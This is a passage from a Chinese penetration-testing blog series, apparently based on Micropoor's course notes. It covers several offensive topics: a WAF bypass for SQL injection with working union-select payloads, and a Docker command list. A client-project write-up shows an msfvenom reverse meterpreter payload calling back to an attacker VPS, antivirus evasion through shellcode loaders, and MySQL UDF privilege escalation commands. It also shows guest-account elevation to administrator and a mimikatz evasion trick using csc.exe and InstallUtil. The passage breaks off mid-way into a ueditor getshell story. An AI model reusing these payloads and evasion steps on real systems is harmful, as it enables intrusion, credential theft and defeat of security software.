<p>默认情况下，我们不需要管后面的参数，如果你想权限维持的话，可以设置Timed为False，并且设置Frequency为定时任务计划表达式，执行的过程中，基本上不会拦截，因为Access Token的调用，一切都是白名单的。<br>
<img src="https://img-blog.csdnimg.cn/2020101121184954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="133__4030"></a>13.3 从打点到域控的练习</h2>
<p>内部书籍资料，不放上来了这块~~</p>
<hr>
<h2><a id="134_bypassdayutwentysixth_days_4034"></a>13.4 安防软件bypass绕过实例（dayu-twenty-sixth days）</h2>
<pre><code class="prism language-c"><span class="token number">1</span>、mysql尝试
</code></pre>
<p>今天我们要介绍的bypass的软件是某知名安全厂商的产品，但是由于一些原因所以我们将他的名字隐去，以下均称为某安防软件，下面我们来尝试怎么绕过他</p>
<p>首先某安防软件是不过滤大部分符号的，所以前期还是可以手工测出注入，但or 跟and百分之1000会拦截，但具体怎么才会拦截？</p>
<p><strong>环境介绍：某安防软件 apache4.0</strong><br>
php5.5<br>
windows<br>
sql-labs 第一关。</p>
<p><strong>2、判断注入点存在</strong></p>
<pre><code class="prism language-c">or 不拦截
and 不拦截
or <span class="token number">1</span>跟 and <span class="token number">1</span> 都拦截
xor <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> 不拦截
xor <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> 不拦截
</code></pre>
<p>以上三个测试合理怀疑 or跟and后面跟有数字才会拦截，但xor（逻辑异或，两个条件其中一个为真时结果才为真）却不会拦截</p>
<pre><code class="prism language-c">or ～<span class="token number">1</span>  不拦截
and ～<span class="token number">1</span> 不拦截
and <span class="token function">hex</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> 不拦截
and <span class="token function">hex</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> 拦截
and <span class="token function">hex</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> 不拦截
or <span class="token operator">~</span><span class="token number">1</span><span class="token operator">=</span><span class="token operator">~</span><span class="token number">1</span> 不拦截
and <span class="token operator">~</span><span class="token operator">!=</span><span class="token operator">~</span><span class="token number">1</span> 不拦截
<span class="token number">1</span> <span class="token operator">|</span> <span class="token number">1</span>  不拦截
</code></pre>
<p>以上测试合理推测 or跟 and后面只要加特定字符加数字，有可能不拦截，然后数字之间是=的话，有可能拦截，可用!= &gt; &lt;等符号代替测试。</p>
<pre><code class="prism language-c">and <span class="token function">hex</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  拦截
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201012105136922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<code>and hex(1)!=hex(1)</code> 不拦截，报错。<br>
<img src="https://img-blog.csdnimg.cn/20201012105157399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<code>and hex(1)!=hex(2)</code> 不拦截，结果正常，确定 注入点存在<br>
<img src="https://img-blog.csdnimg.cn/2020101210521272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c"><span class="token number">3</span>、<span class="token keyword">union</span>联合注入
</code></pre>
<pre><code class="prism language-c"><span class="token keyword">union</span>    不拦截
select   不拦截
<span class="token keyword">union</span> select 拦截
<span class="token keyword">union</span> 各种字符 select 拦截
<span class="token keyword">union</span><span class="token operator">/</span>select<span class="token operator">/</span> 不拦截
</code></pre>
<p>但 <code>union/select/ 1,2,3</code>  出不了数据<br>
但<code>XXX//sql/Less-1/?id=-1’ union/!11440select/1,2,3 – +</code>这样可以<br>
<img src="https://img-blog.csdnimg.cn/20201012105251275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>出数据：</strong></p>
<pre><code class="prism language-c"><span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 拦截
current_user 不拦截
<span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 拦截
<span class="token function">hex</span><span class="token punctuation">(</span>database<span class="token comment">//(//)) 不拦截  但要自己hex转str</span>
http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>XXX<span class="token comment">//sql/Less-1/?id=-1e1' union/!11440select/1/*/,/!11440database()/,3 – +拦截</span>
http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>XXX<span class="token comment">//sql/Less-1/?id=-1e1' union/!11440select/1/asaaaaa/,/!11440database()/,3 – +拦截</span>
http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>XXX<span class="token comment">//sql/Less-1/?id=-1e1' union/!11440select/1/!a/,/!11440database()/,3 – +</span>
</code></pre>
<p><strong>出数据例子，不拦截</strong></p>
<pre><code class="prism language-c"><span class="token operator">-</span><span class="token number">1</span>’ <span class="token keyword">union</span><span class="token operator">/</span><span class="token operator">!</span><span class="token number">11440</span>select<span class="token operator">*</span><span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span><span class="token number">3</span> from security<span class="token punctuation">.</span>users limit <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span>– <span class="token operator">+</span>
不拦截
</code></pre>
<hr>
<h2><a id="135_DockerDocker_4118"></a>13.5 Docker常用命令与Docker逃逸漏洞复现</h2>
<p><strong>Docker常用命令：</strong></p>
<p>操作镜像相关命令</p>
<pre><code class="prism language-c">docker pull <span class="token punctuation">[</span>Repository name<span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token punctuation">[</span>tag<span class="token punctuation">]</span> 	<span class="token comment">//从docker镜像仓库获取镜像</span>

docker search <span class="token punctuation">[</span>image name<span class="token punctuation">]</span> 				<span class="token comment">// Docker Hub中查找镜像 </span>

docker image Is <span class="token operator">/</span>docker images 			<span class="token comment">//列出已有镜像 </span>

docker rmi <span class="token punctuation">[</span>image name<span class="token operator">/</span>image ID<span class="token punctuation">]</span> 		<span class="token comment">//删除镜像(需先删除镜像对应的容器</span>
</code></pre>
<p>操作容器相关命令</p>
<pre><code class="prism language-c">docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token punctuation">[</span>host port<span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token punctuation">[</span>docker port<span class="token punctuation">]</span><span class="token punctuation">[</span>Image name<span class="token punctuation">]</span> bash  <span class="token comment">//新建并启动一个容 </span>

docker ps <span class="token operator">-</span>a 		<span class="token comment">//列出所有容器 </span>

docker exec <span class="token operator">-</span>it <span class="token punctuation">[</span>container id<span class="token punctuation">]</span> bash 		<span class="token comment">//进入一个docker容器</span>

docker cp <span class="token punctuation">[</span>file path<span class="token punctuation">]</span> <span class="token punctuation">[</span>container id<span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token punctuation">[</span>container path<span class="token punctuation">]</span>  <span class="token comment">//拷贝文件到容器 </span>

docker start<span class="token operator">/</span>stop <span class="token punctuation">[</span>container id<span class="token punctuation">]</span> 		<span class="token comment">//启动/停止容器 </span>

docker rm <span class="token punctuation">[</span>container id<span class="token punctuation">]</span> 		<span class="token comment">//删除容器(先停止容器,再丹</span>
</code></pre>
<p>另外参考：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>cnblogs<span class="token punctuation">.</span>com<span class="token operator">/</span>me115<span class="token operator">/</span>p<span class="token operator">/</span><span class="token number">5539047.</span>html   <span class="token operator">--</span>Docker 常用命令

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>infoq<span class="token punctuation">.</span>cn<span class="token operator">/</span>article<span class="token operator">/</span>KBTRC719<span class="token operator">-</span>r6GHOPS3Cr8   <span class="token operator">--</span>深入
</code></pre>
<p>漏洞复现</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>thinkycx<span class="token punctuation">.</span>me<span class="token operator">/</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">05</span><span class="token operator">-</span><span class="token number">23</span><span class="token operator">-</span>CVE<span class="token operator">-</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">5736</span><span class="token operator">-</span>docker<span class="token operator">-</span>escape<span class="token operator">-</span>recurrence<span class="token punctuation">.</span>html  <span class="token operator">--</span>CVE<span class="token operator">-</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">5736</span> docker escape 漏洞复现
</code></pre>
<p>很多很多复现的文章~~</p>
<hr>
<h2><a id="136__4161"></a>13.6 渗透沉思录</h2>
<p>首先感谢Micro8大佬…</p>
<p>本课时，未包含相关技术介绍，但笔者认为本课便是整个系列的点睛，故此时选择主谈一课时“关于渗透的沉思”。</p>
<p>在谈"渗透的沉思"之前，先来解决几个问题。也是这几天邮件以及留言的主要问题之一</p>
<pre><code class="prism language-c">刚入门应该学习那一块知识？<span class="token operator">/</span>安全从业者工作多年感觉心累，知识更新太快，跟不上了，怎么办？

是不是应该选择并新学习一个大型渗透框架来做渗透？

某项目<span class="token operator">/</span>某目标渗透没有任何思路了，怎么办？
</code></pre>
<p>这三个问题应该是每一个安全从业者在不同的阶段一定会遇到的三个问题。同时笔者曾遇到过三四次瓶颈，也分别与以上大致相同，只是第四次迷茫瓶颈，会在未来的课时中更新。</p>
<p>网络安全是一个特殊的行业，亦正亦邪。亦又一新兴行业，虽前景可期，但是大多数人都在”摸石头过河“。虽前岸可期，却对河水深浅无所知。无论是入门还是工作多年都会遇到特别迷茫期，选择哪个方向，亦或者知识无心更新，网络安全应该选择一个可以“沉淀”下来的方向便是最好的方向，让多年的知识或者技能沉淀下来，形成知识化，体系化，与传递化。最简单的一个例子，笔者应该在2009年写过“针对一流信息拦截系统”的技巧与归纳，回过头看来，这个技术在今天还能用吗？甚至“一流拦截”这个软件都没了。但是能留下来至今依然有用的便是：知识化（对一流拦截的研究总结），体系化（对当时waf等的系统归纳），传递化（文章分享）。我把它简称渗透"三板斧"，更像是：学习，归纳，总结，分享的一个完整流程。并非知识太快，并非哪一安全方向领域就一定更有前景，而是这“三板斧”是否完整连接。</p>
<p>渗透测试发展到如今，工具五彩缤纷，框架五颜六色，姿势日益骚奇。知识来源手段源源不断，一会推特，一会小密圈，眼花缭乱，应该怎么去看待？这里笔者先把这个问题放下来，不知大家看没看过《天龙八部》，也借此缅怀金庸先生，在天龙八部中，原著用一百万字在讲述一个非常悲剧的故事，想复仇的得不到复仇，想复国的得不到复国，想复婚的得不到复婚。虚竹呢？又是不忘初心，虽内功与美人竟得，但却再也回不去少林了。刚认父母，便生死相离。8个字概括整个著作便是人生八苦：生苦，老苦，病苦，死苦，怨憎会苦，爱别离苦，求不得苦，五阴炽盛苦。也正是Micro8系列的主旨8章标题，在扫地僧一集中是这样说道：</p>
<p><img src="https://img-blog.csdnimg.cn/20201012113252973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
同样渗透也一样，并不是强制个人追求工具，框架，姿势来强制推演表面的功力，正如鸠摩智一样，靠小无相功来驱动少林72绝技，最终走火入魔，人走向最后的迷茫。反观乔峰，主要就会那么几招，便震出扫地僧口吐少许鲜血。获取工具/框架/姿势等越多并非是一件好事，当没有自己的知识体系的时候，反而导致知识混乱，体系复杂。当遇上实战场景，不知用哪一招来制胜。混乱一通，权限丢失，踪迹露出。最终一场空。渗透的沉思非常重要，尤其是在后渗透阶段，需要有着一套非常完整周期计划，思考可能遇到的问题，或者通过已知的信息搜集，来推导可能面临的问题，这就是渗透的沉思。招式不在多，在于精，力道不在狠，在于寸。故本系列并非是仅仅msf教程，仅仅是认为它能让笔者融会贯通，在结合到其它需求，借力发力的去进一步渗透。说到融汇贯通，必须要提到“链”，安全是一个链安全，攻击引入链攻击，后门引入链后门。具体参考：高级持续渗透系列的连载，它不是在讲述一个后门，而是一个概念的引入。</p>
<p>渗透的本质是信息搜集，每一次的项目如果碰到迷茫无解的时候，请继续搜集。而信息搜集的本质是渗透的沉思，与线索“链”的关联。每一次真实的攻击演练项目，最难得并非是入侵攻击，也并非是得到域控或最高权限。而是如何把渗透攻击演变成一次对己有利的一个过程。后渗透需要沉淀，而沉淀需要给渗透留下沉思的时间。用“沉思”来化解五彩缤纷的工具，五颜六色的框架，日益骚奇的姿势，当戾气化解时，形成一套自我知识体系。</p>
<p>愿每一位读者能找到自己能融合贯通的“武功”，在结合吞噬其他“招式”，如行云流水，石便是器，枝便是剑</p>
<hr>
<h2><a id="137__4190"></a>13.7 项目回忆：体系的本质是知识点串联</h2>
<p><strong>一次普通的项目，做完后，却陈思很久，遂打算一气合成把整个流程记录下来，此篇再一次的叮嘱我：分享便是我最好的老师  —Micropoor</strong></p>
<p>拿shell过程略过。（由于文章在项目实施结束形成，故部分无图或补图）</p>
<p><strong>目标机背景：</strong></p>
<p>windows 2008 r2 x64位 360主动 + 360卫士 + 360杀毒 + waf，目标机仅支持 aspx。运行 OAWeb 服务（.net+mssql），并且是内网中其他服务器的数据库服务器（mysql 数据库，不支持 php，无 .net for mysql 驱动）</p>
<p><img src="https://img-blog.csdnimg.cn/20201012113534554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>端口开放如下：</strong><br>
<img src="https://img-blog.csdnimg.cn/20201012113548903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>需要解决的第一个问题：payload</strong></p>
<p>由于目标机，安装某套装，payload 一定是必须要解决的问题。当 tasklist 的时候，看到如下图几个进程的时候，第一反应就是需要做 payload 分离免杀。分离免杀主要分两大类，一类为第三方分离免杀，一类为自带安装分离免杀。文章中，采取了第三方分离免杀。<br>
<img src="https://img-blog.csdnimg.cn/20201012113606217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>本地补图（由于项目在实施后形成该文章，故本地靶机补图）</strong></p>
<p>目前的反病毒安全软件，常见有三种，一种基于特征，一种基于行为，一种基于云查杀。云查杀的特点基本也可以概括为特征查杀。无论是哪种，都是特别针对PE头文件的查杀。尤其是当payload文件越大的时候，特征越容易查杀。</p>
<p>既然知道了目前的主流查杀方式，那么反制查杀，此篇采取特征与行为分离免杀。避免PE头文件，并且分离行为，与特征的综合免杀。适用于菜刀下等场景，也是我在基于windows下为了更稳定的一种常用手法。载入内存。</p>
<hr>
<p><strong>0x00:以msf为例：监听端口</strong><br>
<img src="https://img-blog.csdnimg.cn/20201012113640377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>0x01：这里的payload不采取生成pe文件，而采取shellcode方式，来借助第三方直接加载到内存中。避免行为：</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp lhost<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span> lport<span class="token operator">=</span><span class="token number">8080</span> <span class="token operator">-</span>e x86<span class="token operator">/</span>shikata_ga_nai <span class="token operator">-</span>i <span class="token number">5</span> <span class="token operator">-</span>f raw <span class="token operator">&gt;</span> test<span class="token punctuation">.</span>c
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201012113710634.png#pic_center" alt="在这里插入图片描述"><br>
<strong>0x02:既然是shellcode方式的payload，那么需要借助第三方来启动，加载到内存。执行shellcode，自己写也不是很难，这里我借用一个github一个开源：</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>clinicallyinane<span class="token operator">/</span>shellcode_launcher<span class="token operator">/</span>
</code></pre>
<p>作者的话：建议大家自己写shellcode执行盒，相关代码网上非常成熟。<br>
<img src="https://img-blog.csdnimg.cn/20201012113750900.png#pic_center" alt="在这里插入图片描述"></p>
<p>生成的payload大小如下：476字节。<br>
<img src="https://img-blog.csdnimg.cn/20201012113758209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
世界杀毒网：<br>
<img src="https://img-blog.csdnimg.cn/20201012113814579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>上线成功。<br>
<img src="https://img-blog.csdnimg.cn/20201012113819994.png#pic_center" alt="在这里插入图片描述"></p>
<p>而关于自带安装分离免杀，请参考我在公司 Wiki 上写的第六十九课时<code>payload分离免杀思路第二季</code></p>
<p>payload 反弹到 vps 的 msf 上，我的权限仅仅如下<br>
<img src="https://img-blog.csdnimg.cn/20201012113842407.png#pic_center" alt="在这里插入图片描述"></p>
<hr>
<p><strong>需要解决的第二个问题：提权</strong></p>
<p>参考主机背景图，184个补丁，以及某套装。遂放弃了exp提权。</p>
<pre><code class="prism language-c">原因<span class="token number">1</span>：需要更多的时间消耗在对反病毒软件对抗。  
原因<span class="token number">2</span>：目标机补丁过多。需要消耗更多的时间  
原因<span class="token number">3</span>：非常艰难的环境下，拿到了权限，不想因为某些exp导致蓝屏从而丢失权限。
</code></pre>
<p>开始翻阅目标机上的文件，以及搜集目标机的端口，服务，启动等一系列信息。发现目标机安装mysql，并与内网其中一台建立大量连接。mysql版本为5.1.49-community-log</p>
<p>下载目标机<code>*..MYI，*.MYD，*.frm，</code>加载于本地mysql。得到目标机root密码<br>
<img src="https://img-blog.csdnimg.cn/20201012113940863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
而目标机没有相关脚本环境连接mysql，到这里，可以有2个方向针对该问题作出解决</p>
<pre><code class="prism language-c">一：转发目标机端口到本地，从而操作mysql。  
二：在非交互式下，完成mysql udf的提权。
</code></pre>
<p>为了减少目标主机的流量探测，以及维护来之不易的session，故选择了第二种方案。非交互式下，mysql提权。</p>
<p>命令行下，调用mysql是需要在启动一个mysql窗口，从而继续执行，而session下没有这样的条件。但mysql的 -e 参数 作为直接执行sql语句，从而不另启动窗口。而-e需要注意的事项，use database。</p>
<p>也就是所有参数需要mysql.xxxx<img src="https://img-blog.csdnimg.cn/20201012113959946.png#pic_center" alt="在这里插入图片描述"><br>
如没有指定database，将会出现如下错误，而使用UNION，将不会有回显，一定出现问题，将会很难定位，故选择以mysql.x的方式指定。<br>
<img src="https://img-blog.csdnimg.cn/20201012114017457.png#pic_center" alt="在这里插入图片描述"></p>
<p>大致流程如下：</p>
<pre><code class="prism language-c">mysql <span class="token operator">-</span>uroot <span class="token operator">-</span>pXXXXXX <span class="token operator">-</span>e <span class="token string">"create table mysql.a (cmd LONGBLOB);"</span> 
mysql <span class="token operator">-</span>uroot <span class="token operator">-</span>pXXXXXX <span class="token operator">-</span>e <span class="token string">"insert into mysql.a (cmd) values (hex(load_file('D:\\XXXXXXXXXX\\mysql5\\lib\\plugin\\u.dll')));"</span>
mysql <span class="token operator">-</span>u root <span class="token operator">-</span>pXXXXXX <span class="token operator">-</span>e <span class="token string">"SELECT unhex(cmd) FROM mysql.a INTO DUMPFILE 'D:/XXXXXXXXXX/mysql5/lib/plugin/uu.dll';"</span>
mysql <span class="token operator">-</span>uroot <span class="token operator">-</span>pXXXXXX <span class="token operator">-</span>e <span class="token string">"CREATE FUNCTION shell RETURNS STRING SONAME 'uu.dll'"</span> 
mysql <span class="token operator">-</span>uroot <span class="token operator">-</span>pXXXXXX <span class="token operator">-</span>e <span class="token string">"select shell('cmd','whoami');"</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201012114033194.png#pic_center" alt="在这里插入图片描述"></p>
<hr>
<p><strong>需要解决的第三个问题：登录服务器</strong></p>
<p>在有套装的环境下，默认拦截cmd下加帐号，而目前又无法抓取系统登录明文。mimikatz被查杀。cmd下调用powershell被拦截。遂选择激活guest帐号，并提升到administrators组，来临时登录目标机。<br>
<img src="https://img-blog.csdnimg.cn/20201012114052133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201012114110170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<p><strong>socks代理登录目标机：</strong><br>
<img src="https://img-blog.csdnimg.cn/20201012114133892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>需要解决的第四个问题：抓取目标机明文密码</strong></p>
<p>登录服务器后，目前依然不知道目标机的密码。这里有两种方向来解决该问题。</p>
<pre><code class="prism language-c">一：关闭我能关闭的套装，由于管理员没有注销登录。能关闭的有限。  
二：分离免杀做mimikatz密码抓取
</code></pre>
<p><strong>作者选择了第二种方案：</strong></p>
<p>这里需要用到csc.exe，与InstallUtil.exe<br>
关于两个文件默认安装位置：（注意x32，x64区别）</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework\
C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework64\
C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework\
C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework64\
</code></pre>
<p><strong>分别执行：</strong></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework64\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\csc<span class="token punctuation">.</span>exe <span class="token operator">/</span>r<span class="token punctuation">:</span>System<span class="token punctuation">.</span>EnterpriseServices<span class="token punctuation">.</span>dll <span class="token operator">/</span>r<span class="token punctuation">:</span>System<span class="token punctuation">.</span>IO<span class="token punctuation">.</span>Compression<span class="token punctuation">.</span>dll <span class="token operator">/</span>target<span class="token punctuation">:</span>library <span class="token operator">/</span>out<span class="token punctuation">:</span>Micropoor<span class="token punctuation">.</span>exe <span class="token operator">/</span>keyfile<span class="token punctuation">:</span>C<span class="token punctuation">:</span>\Users\Johnn\Desktop\installutil<span class="token punctuation">.</span>snk <span class="token operator">/</span>unsafe
C<span class="token punctuation">:</span>\Users\Johnn\Desktop\mimi<span class="token punctuation">.</span>cs

C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework64\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\InstallUtil<span class="token punctuation">.</span>exe <span class="token operator">/</span>logfile<span class="token operator">=</span> <span class="token operator">/</span>LogToConsole<span class="token operator">=</span>false <span class="token operator">/</span>U C<span class="token punctuation">:</span>\Users\Johnn\Desktop\Micropoor<span class="token punctuation">.</span>exe
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201012114225292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201012114231262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<p><strong>派生出的第五个问题：横向渗透</strong></p>
<p>关于第五个问题，本意并不是该篇幅所要讲述的，后续是搜集目标机的mssql，mysql，rdp 密码。搜集所在内网的拓扑，来辅助本次的横向扩展。便完成了本次的项目。 如需具体，请参考我在Wiki上的系列教程78，79，12，13，71课时<br>
<img src="https://img-blog.csdnimg.cn/20201012114351982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
后者的话： 本次的整个流程，并没有遇到太多的问题，仅仅是把几个知识点的串联起来，形成的一个完整的渗透。也许你了解知识点1，也了解知识点2，还了解知识点3等等。但是一次完整的项目是离不开每一个知识点的串联与灵活运用。这应该是每一个信息安全从业人员值得思考的问题</p>
<hr>
<h2><a id="138_FridaAPP_4332"></a>13.8 Frida在APP远程加解密中的应用</h2>
<p>我没有研究过APP方面的渗透测试，这里的知识内部书籍介绍的知识点我看完了，了解了个过程，APP渗透这方面等有了时间和成果在回来补进来~~</p>
<hr>
<h2><a id="139_OracleRAC_4336"></a>13.9 漏洞修复系列之Oracle远程数据投毒漏洞修复(非RAC环境)</h2>
<p>最新文章…</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>blog<span class="token punctuation">.</span>csdn<span class="token punctuation">.</span>net<span class="token operator">/</span>weixin_44455388<span class="token operator">/</span>article<span class="token operator">/</span>details<span class="token operator">/</span><span class="token number">107960090</span>   <span class="token operator">--</span>Oracle远程投毒漏洞CVE<span class="token operator">-</span><span class="token number">2012</span><span class="token operator">-</span><span class="token number">1675</span>解决方法
</code></pre>
<p>该漏洞属于很早就出现了，很多文章都有修复该漏洞的方法，知道如何修复即可…</p>
<hr>
<h2><a id="1310_ueditorgetshell_4346"></a>13.10 记一次ueditor老版本的非常规getshell</h2>
<p><strong>前言：</strong></p>
<p>本篇文章是关于一次渗透测试中意外getshell的记录，属于ueditor v1.3.x 的aspx语言的非网上流传的getshell方式。由于当时在网上搜索并未发现该种getshell方法，故分享给各位。</p>
<p><strong>经过：</strong></p>
<p>起因是针对某客户网站进行渗透测试时，发现了一个ueditor编辑器路径，并且网站是aspx，经验丰富的渗透测试人员应该都已经想到网上广为流传的v1.4.3的那个远程文件加载绕过导致的getshell方式。起初，我也是第一反应去进行该尝试，但是网站回馈对应漏洞url404。在测试结束其他功能点后，再回过来看这个漏洞，我产生一个疑问，据我说知，ueditor是个由唯一入口文件\ueditor\net\controller.ashx 进行请求分发。如果开发知识单纯得删除了漏洞文件，必然影响网站的正常使用。起于该思虑，我下载了v1.3.6版本的net源码，进行查看。</p>
<p><img src="https://img-blog.csdnimg.cn/20201012203643782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
确认后了解，ueditor在1.4.x版本对整体设计架构进行改版，在v1.3.x,还是离散的功能文件存在的，上传功能在\ueditor3\net\fileUp.ashx。代码如下：</p>
